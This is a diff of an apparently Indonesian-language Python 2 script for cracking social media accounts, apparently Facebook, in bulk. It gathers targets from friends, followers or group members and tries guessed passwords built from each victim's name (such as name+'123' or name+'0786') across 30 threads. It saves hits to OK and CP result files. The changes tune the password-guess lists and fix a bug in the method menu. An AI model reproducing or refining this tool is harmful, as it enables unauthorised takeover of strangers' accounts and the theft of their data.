@@ -100,7 +100,7 @@ def menu():
 	print(" [ selamat datang \033[0;93m%s\033[0;97m ]\n"%(nama))
 	print(" 1 Target From public/Friends")
 	print(" 2 Target From followers")
-	print(" 3 Target From public/Posts")
+	print(" 3 Target From Group members")
 	print(" 4 check result crack")
 	print(" 5 Get user agent")
 	print(" 0 keluar (hapus token)")
@@ -228,11 +228,11 @@ def massal():
 
 def method():
 	print(" \n [ pilih method crack - coba method satu² ]\n")
-	print(" 1 method b-api  (Fast Crack)")
+	print(" 1 method b-api  (Fast crack)")
 	print(" 2 method mbasic (slow crack)")
-	print(" 3 method mobile (Free Crack)")
+	print(" 3 method mobile (free crack)")
 	method = raw_input("\n ? method : ")
-	if angga == "":
+	if method == "":
 		menu()
 	elif method == "1":
 		ask = raw_input(" ? Use password manual? y/t: ")
@@ -240,7 +240,7 @@ def method():
 			manual()
 		print("\n + hasil OK tersimpan di : OK/%s.txt"%(tanggal))
 		print(" + hasil CP tersimpan di : CP/%s.txt\n"%(tanggal))
-		print(" ! if no result turn on airplane mode 5 seconds\n")
+		print(" ! jika tidak ada hasil hidupkan mode pesawat 5 detik\n")
 		ThreadPool(30).map(bapi, id)
 		exit("\n\n # selesai...")
 	elif method == "2":
@@ -291,13 +291,13 @@ def bapi(user):
 	); sys.stdout.flush()
 	uid, name = user.split("<=>")
 	if len(name)>=6:
-		pwx = [name, name+"123", name+"1234", name+"12345" ]
+		pwx = [ name, name+"123", name+"1234", name+"12345" ]
 	elif len(name)<=2:
 		pwx = [ name+"123", name+"1234", name+"12345" ]
 	elif len(name)<=3:
-		pwx = [ name+"1", name+"12345" ]
+		pwx = [ name+"123", name+"12345" ]
 	else:
-		pwx = [ name+"786", name+"123456" ]
+		pwx = [ name+"0786", name+"1" ]
 	try:
 		for pw in pwx:
 			pw = pw.lower()
@@ -336,7 +336,7 @@ def mbasic(user):
 	elif len(name)<=2:
 		pwx = [ name+"123", name+"1234", name+"12345" ]
 	elif len(name)<=3:
-		pwx = [ name+"1", name+"12345" ]
+		pwx = [ name+"123", name+"12345" ]
 	else:
 		pwx = [ name+"0786", name+"1" ]
 	try:
@@ -390,7 +390,7 @@ def mobile(user):
 	elif len(name)<=3:
 		pwx = [ name+"123", name+"12345" ]
 	else:
-		pwx = [ name+"1", name+"123456" ]
+		pwx = [ name+"0786", name+"1" ]
 	try:
 		for pw in pwx:
 			kwargs = {}
